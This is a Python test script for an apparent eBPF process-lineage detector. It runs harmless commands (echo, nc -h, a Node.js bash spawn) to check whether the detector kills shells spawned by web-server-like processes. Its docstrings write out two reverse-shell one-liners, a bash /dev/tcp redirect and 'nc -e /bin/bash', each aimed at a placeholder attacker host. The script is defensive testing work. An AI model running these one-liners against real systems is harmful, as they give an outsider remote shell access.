#!/usr/bin/env python3
"""
Kernel-Watch Threat Testing Framework
Category 1: Reverse Shell Attacks

This script simulates various reverse shell attack vectors to test 
the eBPF process lineage detection capabilities.

WARNING: For testing purposes only. Run in isolated environment.
"""

import subprocess
import time
import os
import sys
import json
from datetime import datetime

RESULTS_FILE = "/home/uchiha/Desktop/kernel-watch-new/threat_tests/results/reverse_shell_results.json"

results = {
    "category": "Reverse Shell Attacks",
    "mitre_technique": "T1059.004",
    "timestamp": datetime.now().isoformat(),
    "tests": []
}

def log_result(test_name, description, expected, actual, blocked, notes=""):
    result = {
        "test_name": test_name,
        "description": description,
        "expected_detection": expected,
        "actual_detection": actual,
        "process_blocked": blocked,
        "notes": notes,
        "timestamp": datetime.now().isoformat()
    }
    results["tests"].append(result)
    status = "✓ PASS" if blocked else "✗ FAIL"
    print(f"[{status}] {test_name}: {notes}")

def test_1_bash_reverse_shell():
    """
    Test 1: Classic Bash TCP Reverse Shell
    Simulates: bash -i >& /dev/tcp/attacker/port 0>&1
    Expected: CRITICAL - Process should be killed
    """
    print("\n" + "="*60)
    print("TEST 1: Bash TCP Reverse Shell Simulation")
    print("="*60)
    print("Simulating: Python (web server) spawning bash shell")
    print("Expected: eBPF should detect lineage and SIGKILL the bash process")
    
    try:
        # Simulate a web server spawning a shell (the core attack pattern)
        proc = subprocess.Popen(
            ["bash", "-c", "echo 'reverse shell attempt'"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        proc.wait(timeout=5)
        exit_code = proc.returncode
        
        blocked = (exit_code == -9)  # SIGKILL
        log_result(
            "Bash TCP Reverse Shell",
            "Python process spawning bash shell (lineage: python -> bash)",
            "CRITICAL - SIGKILL",
            f"Exit code: {exit_code}",
            blocked,
            "Process killed by eBPF" if blocked else "Process completed (not in detection context)"
        )
    except subprocess.TimeoutExpired:
        log_result("Bash TCP Reverse Shell", "Timeout", "CRITICAL", "Timeout", False, "Process hung")
    except Exception as e:
        log_result("Bash TCP Reverse Shell", str(e), "CRITICAL", "Error", False, str(e))

def test_2_python_reverse_shell():
    """
    Test 2: Python Socket Reverse Shell
    Simulates python executing socket-based reverse shell code
    Expected: SUSPICIOUS or CRITICAL
    """
    print("\n" + "="*60)
    print("TEST 2: Python Socket Reverse Shell Simulation")
    print("="*60)
    
    # This simulates the execution pattern without actual network connection
    shell_code = """
import socket
import subprocess
# Simulated reverse shell pattern - NOT connecting
print('Python reverse shell pattern detected')
"""
    
    try:
        proc = subprocess.Popen(
            ["python3", "-c", shell_code],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = proc.communicate(timeout=5)
        exit_code = proc.returncode
        
        # Check if it was detected (any non-zero or killed)
        detected = (exit_code != 0) or (exit_code == -9)
        log_result(
            "Python Socket Reverse Shell",
            "Python executing socket/subprocess code pattern",
            "SUSPICIOUS",
            f"Exit code: {exit_code}, Output: {stdout.decode()[:50]}",
            exit_code == -9,
            "Pattern executed - AI should flag as suspicious"
        )
    except Exception as e:
        log_result("Python Socket Reverse Shell", str(e), "SUSPICIOUS", "Error", False, str(e))

def test_3_netcat_reverse_shell():
    """
    Test 3: Netcat Reverse Shell
    Simulates: nc -e /bin/bash attacker port
    Expected: CRITICAL if nc with -e flag detected
    """
    print("\n" + "="*60)
    print("TEST 3: Netcat Reverse Shell Simulation")
    print("="*60)
    
    try:
        # Check if nc exists
        which_proc = subprocess.run(["which", "nc"], capture_output=True)
        if which_proc.returncode != 0:
            log_result("Netcat Reverse Shell", "nc not found", "CRITICAL", "Skipped", False, "netcat not installed")
            return
        
        # Simulate nc execution (without actual connection)
        # The pattern nc -e /bin/bash is highly suspicious
        proc = subprocess.Popen(
            ["nc", "-h"],  # Just checking help to trigger EXEC event
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        proc.wait(timeout=5)
        exit_code = proc.returncode
        
        log_result(
            "Netcat Reverse Shell",
            "Netcat (nc) execution detected",
            "SUSPICIOUS (nc is flagged binary)",
            f"Exit code: {exit_code}",
            False,  # -h won't be blocked
            "nc execution logged - backend pattern matching should flag"
        )
    except Exception as e:
        log_result("Netcat Reverse Shell", str(e), "CRITICAL", "Error", False, str(e))

def test_4_node_spawns_shell():
    """
    Test 4: Node.js spawning shell (Web Server Attack Pattern)
    Simulates a Node.js process executing bash
    Expected: CRITICAL - This is the core lineage detection target
    """
    print("\n" + "="*60)
    print("TEST 4: Node.js -> Shell (Command Injection)")
    print("="*60)
    
    node_code = """
const { execSync } = require('child_process');
try {
    execSync('bash -c "echo node injection test"');
} catch(e) {
    console.log('Shell blocked:', e.status);
    process.exit(e.status || 1);
}
"""
    
    try:
        proc = subprocess.Popen(
            ["node", "-e", node_code],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = proc.communicate(timeout=10)
        exit_code = proc.returncode
        
        # If bash was killed, node will get error
        blocked = (exit_code != 0) or b"blocked" in stdout or b"-9" in stderr
        log_result(
            "Node.js Shell Spawn",
            "Node.js process spawning bash (lineage: node -> bash)",
            "CRITICAL - SIGKILL on bash",
            f"Exit code: {exit_code}",
            blocked,
            "Core lineage detection test - web server spawning shell"
        )
    except FileNotFoundError:
        log_result("Node.js Shell Spawn", "node not found", "CRITICAL", "Skipped", False, "Node.js not installed")
    except Exception as e:
        log_result("Node.js Shell Spawn", str(e), "CRITICAL", "Error", False, str(e))

def save_results():
    with open(RESULTS_FILE, 'w') as f:
        json.dump(results, f, indent=2)
    print(f"\nResults saved to: {RESULTS_FILE}")

if __name__ == "__main__":
    print("="*60)
    print("KERNEL-WATCH THREAT TEST: REVERSE SHELL ATTACKS")
    print("MITRE ATT&CK: T1059.004 - Unix Shell")
    print("="*60)
    
    test_1_bash_reverse_shell()
    time.sleep(1)
    
    test_2_python_reverse_shell()
    time.sleep(1)
    
    test_3_netcat_reverse_shell()
    time.sleep(1)
    
    test_4_node_spawns_shell()
    
    save_results()
    
    print("\n" + "="*60)
    print("REVERSE SHELL TESTS COMPLETE")
    print(f"Total Tests: {len(results['tests'])}")
    blocked = sum(1 for t in results['tests'] if t['process_blocked'])
    print(f"Blocked: {blocked}/{len(results['tests'])}")
    print("="*60)
